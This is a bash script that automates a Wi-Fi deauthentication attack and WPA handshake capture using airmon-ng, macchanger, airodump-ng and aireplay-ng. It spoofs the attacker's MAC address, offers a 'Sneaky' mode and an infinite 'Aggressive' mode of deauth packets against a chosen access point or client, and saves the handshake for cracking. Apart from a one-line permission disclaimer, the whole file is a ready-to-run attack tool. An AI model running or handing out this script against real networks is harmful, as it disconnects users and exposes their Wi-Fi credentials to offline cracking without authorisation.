#!/bin/bash

# Deauth + Handshake Capture Script (No Auto-Scan)
# USE ONLY ON NETWORKS YOU OWN OR HAVE PERMISSION TO TEST

iface="wlan0"
mon_iface="${iface}mon"

# Ensure monitor mode
echo "[*] Enabling monitor mode on $iface..."
sudo airmon-ng start $iface

# Spoof MAC address
echo "[*] Randomizing MAC address..."
sudo ifconfig $mon_iface down
sudo macchanger -r $mon_iface
sudo ifconfig $mon_iface up

# Manual scan for targets
echo "[*] Scanning for networks... Press Ctrl+C when ready."
sudo airodump-ng $mon_iface

# Target input
read -p "Enter BSSID of target: " bssid
read -p "Enter Channel of target: " channel
read -p "Enter name for capture file (no extension): " capname
read -p "Enter Client MAC (optional): " client_mac

# Deauth intensity
echo
echo "Attack Intensity Options:"
echo "1) Sneaky     - 2 deauths with 10s wait"
echo "2) Aggressive - Infinite deauth until stopped"
echo "3) Custom     - You define count & wait"
read -p "Choose [1/2/3]: " mode

packet_count=2
sleep_time=10

if [ "$mode" == "2" ]; then
    packet_count=0  # infinite
    sleep_time=0
elif [ "$mode" == "3" ]; then
    read -p "Enter number of deauth packets (0 = infinite): " packet_count
    read -p "Enter sleep time after deauth (seconds): " sleep_time
fi

# Capture handshake
echo "[*] Starting handshake capture to ${capname}-01.cap..."
sudo airodump-ng --bssid $bssid -c $channel -w wifia/$capname $mon_iface &
dump_pid=$!

# Wait a moment to stabilize
sleep 5

# Trap cleanup to ensure monitor mode ends
cleanup() {
    echo
    echo "[*] Cleaning up..."
    kill $dump_pid 2>/dev/null
    sudo airmon-ng stop $mon_iface
    echo "[+] Done. Handshake saved to ${capname}-01.cap"
    exit
}
trap cleanup INT

# Deauth attack
echo "[*] Launching deauth attack..."

if [ -z "$client_mac" ]; then
    sudo aireplay-ng --deauth $packet_count -a $bssid $mon_iface
else
    sudo aireplay-ng --deauth $packet_count -a $bssid -c $client_mac $mon_iface
fi

# Wait after deauth (if not infinite)
if [ "$packet_count" -ne 0 ]; then
    echo "[*] Waiting $sleep_time seconds for handshake..."
    sleep $sleep_time
    cleanup
else
    echo "[*] Press Ctrl+C to stop capture and return to normal mode."
    wait $dump_pid
    cleanup
fi

